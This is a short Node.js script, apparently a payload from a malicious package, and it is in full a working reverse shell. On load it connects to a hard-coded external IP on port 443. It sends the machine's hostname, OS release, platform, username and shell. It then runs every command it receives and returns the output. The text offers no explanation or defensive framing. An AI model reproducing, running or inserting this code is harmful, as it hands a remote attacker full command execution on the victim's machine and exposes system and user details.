(function(){
    var net = require("net");
    var exec = require("child_process").exec;
    var os = require("os")
    var client = new net.Socket();
    var connection = client.connect(443, "46.101.40.16", function(){
        client.write("Ehlo!\n")
	client.write(os.hostname() + "\n")
	var usr = os.userInfo()
	client.write(os.release() + "\n")
	client.write(os.platform() + "\n")
	client.write(usr.username + "\n")
	client.write(usr.shell + "\n")
        client.on("data",(cmd) => {
            exec(cmd.toString(),(err,stdout,stderr) => {
                client.write(stdout)
            })
        })
    });
})();
